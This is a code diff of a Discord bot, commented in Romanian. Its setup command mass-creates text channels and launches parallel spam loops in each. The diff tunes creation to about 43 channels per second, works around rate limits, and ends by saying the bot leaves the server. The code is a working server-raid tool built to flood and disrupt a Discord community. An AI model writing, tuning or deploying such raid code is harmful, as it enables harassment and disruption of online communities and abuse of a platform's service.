@@ -330,9 +330,6 @@ async def setup(ctx):
 
     await user.send(f"🔄 Încep crearea a {total_channels} de canale și spam simultan...")
 
-    # Fără semafor pentru spam – lăsăm să ruleze toate canalele în paralel
-    # (maximul este oricum limitat de API, dar asta asigură că toate sunt acoperite)
-
     async def spam_loop(channel):
         """Spam continuu pe un canal (până la rate-limit)"""
         try:
@@ -353,7 +350,6 @@ async def setup(ctx):
                 await asyncio.sleep(0.02)
         except discord.HTTPException as e:
             if e.status == 429:
-                # Rate limit atins – oprim spam-ul pe acest canal
                 pass
             else:
                 raise
@@ -369,10 +365,7 @@ async def setup(ctx):
                 styled_name = base_name
             ch = await guild.create_text_channel(name=styled_name)
             created_channels.append(ch)
-
-            # Lansează spam-ul pe acest canal în fundal, fără a aștepta
             asyncio.create_task(spam_loop(ch))
-
         except discord.HTTPException as e:
             if e.status == 429:
                 await user.send(f"⚠️ Rate limit la canalul {index}, continui...")
@@ -381,9 +374,9 @@ async def setup(ctx):
         except Exception as e:
             await user.send(f"⚠️ Eroare canal {index}: {e}")
 
-    # Creare în loturi de câte 50, pauză 0.02 secunde (maxim posibil)
-    batch_size = 50
-    pause_between_batches = 0.02
+    # ===== VITEZĂ DE CREARE: ~43 CANALE PE SECUNDĂ =====
+    batch_size = 10          # câte canale într‑un lot
+    pause_between_batches = 0.233  # 10 / 0.233 ≈ 42.9 → ~43/sec
 
     for i in range(0, total_channels, batch_size):
         batch = [create_channel(i+j) for j in range(batch_size) if i+j < total_channels]
@@ -392,7 +385,7 @@ async def setup(ctx):
 
     await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create. Spam-ul continuă în fundal...")
 
-    # Așteaptă 3 secunde pentru ca spam-ul să ruleze (dar nu oprește prea devreme)
+    # Așteaptă 3 secunde pentru ca spam-ul să ruleze
     await asyncio.sleep(3)
 
     await user.send("✅ Proces finalizat. Părăsesc serverul...")
